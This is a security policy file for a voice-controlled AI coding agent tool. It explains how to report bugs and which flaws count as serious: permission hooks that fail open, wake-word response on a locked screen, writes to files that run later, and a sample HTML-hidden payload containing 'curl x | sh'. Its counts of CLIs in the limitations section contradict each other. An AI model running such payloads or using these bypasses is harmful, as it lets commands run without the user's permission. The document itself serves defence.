# Security

agentvoice puts a microphone between a room and an AI agent that can edit
files and run commands. The interesting bugs here are not crashes; they are
the paths from "somebody said something near the microphone" to "something
ran". If you have found one of those, this is the file that says where to send
it.

## Reporting privately

Email **agent-voice@duanesworld.org**.

Please do not open a public issue for anything that lets a command run without
the permission it needed, or that discloses a credential. Everything else --
wrong transcriptions, a setting that does nothing, a crash -- is welcome in the
tracker, where more people can see it.

Include the version (`manifest.json` has it, and `agentvoice status` prints
the live state), the agent backend you were using, and the permission level
the widget was set to. That last one decides what the guard was supposed to do,
so a report without it usually takes a round trip to understand.

This is one person working on it, not a team with a rota. You will get an
acknowledgement rather than a fix on the first reply, and I would rather tell
you honestly how long something will take than quote you a policy. If you need
a deadline for a disclosure, say so and I will work to it or tell you I cannot.

## What counts as serious here

In rough order. The first group is what this project exists to get right.

**A permission decision that is absent reading as permission.** The guard is
`daemon/permission_hook.py`, and Claude Code treats any exit from it other
than 0-with-a-decision or 2 as a *non-blocking* error -- which means the tool
proceeds. So a traceback, a timeout, a missing interpreter, a space in `$HOME`
breaking the hook command: each of those is not "the guard broke", it is "the
guard was absent, and the thing ran". Anything that reaches that state is the
highest severity in this codebase. `CLAUDE.md` documents the four shapes of
this that have already been fixed, which is a good place to start looking for
the fifth.

**A locked screen that still answers.** A machine that responds to its wake
word behind a lock screen undoes every permission decision in the project by
letting whoever walks up to the desk talk to the agent. Detection, the frame
gate, abandoning a capture in progress and hiding the on-screen readout are
each a separate way to get this wrong, and each has been wrong before.

**Writes that make something else run.** "Edits" is a statement about source
files. A path that is inside the project but changes behaviour on the next run
-- `.claude/settings.json`, `.mcp.json`, `.envrc`, `.git/hooks/*`, a `.joblib`
-- must still ask, and so must anything outside the project at all. Symlinks,
`..`, a dangling link whose parent is inside the project, and a project root
that resolves to the home directory are all ways past this that have been
tried.

**Credential disclosure.** API keys belong in the login keyring or a
mode-checked file, never in `shell.json`, which is a desktop config file that
gets copied between machines and pasted into bug reports. A key is scoped to
one host *and* port. Anything that widens that -- an HTTP redirect carrying an
`Authorization` header, a vendor environment variable sent to somebody else's
endpoint, a plaintext request -- is in scope.

**Untrusted text reaching the UI as markup.** A transcript and a model reply
are attacker-influenced input. Every `Text` that shows one needs
`textFormat: Text.PlainText`, because `AutoText` renders anything that looks
like HTML, and `ls <b></b><!-- ; curl x | sh -->` displayed as `ls` in a
permission prompt is a working attack on the one screen that must not lie.

**The verifier is a pickle.** `joblib` load is arbitrary code execution, so a
personal verifier is only ever trained on the machine it runs on. There is no
download path for one and there must never be a shared "verifier pack",
however convenient it would be. A change that adds one is a vulnerability
even if nothing malicious is ever hosted.

## What is already known, and not a vulnerability

- **A trusted level not asking.** At `trusted` the agent changes files and
  runs commands unchallenged, and the panel says so in those words. That is
  the setting doing its job. The bug would be a *lower* level behaving this
  way.
- **Vosk accepting a phonetic neighbour.** Measured: "hey cloud" scores 1.00
  against a "hey claude" grammar. A grammar cannot reject a near-miss, which
  is why openWakeWord and the personal verifier exist. See
  `bench/FINDINGS.md`.
- **Unpinned Python dependencies.** `requirements*.txt` give ranges on
  purpose, and `CLAUDE.md` explains the tradeoff and that a refresh routine
  has to exist before a lockfile does. Worth arguing about in an issue; not a
  report.
- **Models downloaded at install.** Those are pinned by revision and verified
  by sha256 against `models.lock`, and a file with no recorded hash is
  refused. If you can get an unverified file past that, it *is* a report.
- **The agent reaching the network.** Whichever backend you configure talks to
  its own service. The daemon does not proxy or inspect that, and the README
  says which backends have actually been exercised.

## Known limitations, stated rather than discovered

- **Nine of the ten CLIs on the shared adapter receive the spoken prompt as a
  command-line argument.** `/proc/<pid>/cmdline` is mode 0444 with no hidepid
  on an ordinary Linux box, so another local account can read it while the
  turn runs. Claude Code, Codex, Gemini, Antigravity and Copilot hand it over
  on stdin; the other nine cannot be moved without running them, because a
  prompt sent down a channel a CLI does not read is a turn that hangs. Each
  one closes as somebody runs a real turn against it. On a single-user machine
  this is nothing; on a shared one, prefer a verified backend or an endpoint.
- **The protected-file list is names and locations.** A content search and a
  direct read now get the same answer for the same bytes, which is what the
  list is for. It will not recognise a `prod-dump.sql` full of passwords, and
  no amount of pattern matching would.

## Scope

The daemon, the installer, the control CLI, the permission hook and the
Quickshell widget in this repository. Bugs in the agent CLIs themselves
(Claude Code, Codex, Gemini, Antigravity), in Omarchy, Hyprland or Quickshell
belong to those projects -- though if the *interaction* is what goes wrong,
tell me anyway, because that is usually where this project's mistakes are.

Please test against your own machine and your own agent credentials. Do not
send a proof of concept that runs against anybody else.
